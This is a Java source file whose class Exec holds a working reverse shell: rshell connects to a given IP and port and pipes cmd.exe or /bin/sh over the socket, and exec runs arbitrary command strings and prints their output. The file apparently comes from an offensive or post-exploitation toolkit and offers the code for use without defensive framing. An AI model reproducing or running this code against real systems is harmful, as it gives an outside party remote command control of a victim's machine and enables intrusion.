import java.io.*;
import java.net.Socket;
import java.util.Arrays;

public class Exec {
	public static void rshell(String[] args) {
		if(args.length < 2 || args[0] == "help"){
			System.out.println("Usage: rshell <connect ip> <port>");
		}else{
			String host = args[0];
			int port = Integer.parseInt(args[1]);
			System.out.println(host + port);
			String cmd = "";
			if(System.getProperty("os.name").toLowerCase().indexOf("win") != -1){
				cmd = "cmd.exe";
			}else{
				cmd = "/bin/sh";
			}

			try{
				Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
				Socket s=new Socket(host,port);
				InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
				OutputStream po=p.getOutputStream(),so=s.getOutputStream();
				while(!s.isClosed()){
					while(pi.available()>0)
						so.write(pi.read());
					while(pe.available()>0)
						so.write(pe.read());
					while(si.available()>0)
						po.write(si.read());
					so.flush();
					po.flush();
					Thread.sleep(50);
					try {
						p.exitValue();
						break;
					}
					catch (Exception e){}};
					p.destroy();
					s.close();
			}catch (Exception e){
				e.printStackTrace();
			}
		}
		

	}
	public static void exec(String[] cmd) {
		String s;

		try {
			String cmdString = Arrays.toString(cmd);
			cmdString = cmdString.replace(",", "");
			cmdString = cmdString.replace("[", "");
			cmdString = cmdString.replace("]", "");

			Process process = Runtime.getRuntime().exec(cmdString);

			BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
			BufferedReader stdErr = new BufferedReader(new InputStreamReader(process.getErrorStream()));

			while((s = stdInput.readLine()) != null) {
				System.out.println(s);
			}
			while((s = stdErr.readLine()) != null) {
				System.out.println(s);
			}
		}catch (Exception e) {
			System.out.println("Error:");
			e.printStackTrace();
		}
	}
}
